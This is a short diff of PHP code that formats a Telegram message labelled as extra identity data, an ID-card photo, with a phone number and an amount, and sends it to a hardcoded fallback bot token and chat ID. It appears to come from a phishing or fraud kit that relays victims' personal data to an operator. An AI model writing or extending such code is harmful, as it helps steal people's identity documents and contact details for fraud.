@@ -103,7 +103,7 @@ $FALLBACK_CHAT_ID_OPS   = "-4923753161";
 $token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_OPS;
 $chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_OPS;
 
-$mensaje  = "📸 FOTO / IDENTIDAD\n";
+$mensaje  = "✅ <b>[DATO EXTRA: FOTO / CÉDULA]</b> Datos de identidad y foto:\n";
 $mensaje .= "------------------------\n";
 $mensaje .= "📱 Celular: $celular\n";
 $mensaje .= "💰 Monto: $monto\n";
